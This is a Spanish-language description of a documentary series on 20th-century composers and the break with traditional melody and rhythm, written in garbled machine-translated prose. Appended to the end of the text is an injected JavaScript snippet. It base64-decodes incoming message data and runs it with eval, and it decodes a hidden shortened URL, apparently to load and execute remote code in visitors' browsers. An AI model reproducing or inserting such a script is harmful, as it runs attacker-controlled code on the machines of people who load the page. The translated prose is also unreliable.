Descripcion
La serie 3×60 minutos, se explora los compositores se sintieron obligados a crear la música desafiante que hicieron y cómo fueron influenciados por los trastornos morales, filosóficas y sociales de la época. 
En este primer episodio, Wrecking Ball, una serie de compositores de renombre explorar los fundamentos de la música contemporánea y discutir por qué los compositores del siglo 20 ha optado deliberadamente por descartar las estructuras tradicionales de la forma, la melodía y el ritmo en favor de consonancia y disonancia.  El episodio revela la historia de una guerra cultural – donde las mayores bajas fueron las mismas cosas que la mayoría de las personas buscadas por la música: un ritmo constante y una melodía reconocible, y aborda cómo gran parte de la audiencia más amplia, la innovación, de hecho, la alienación. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

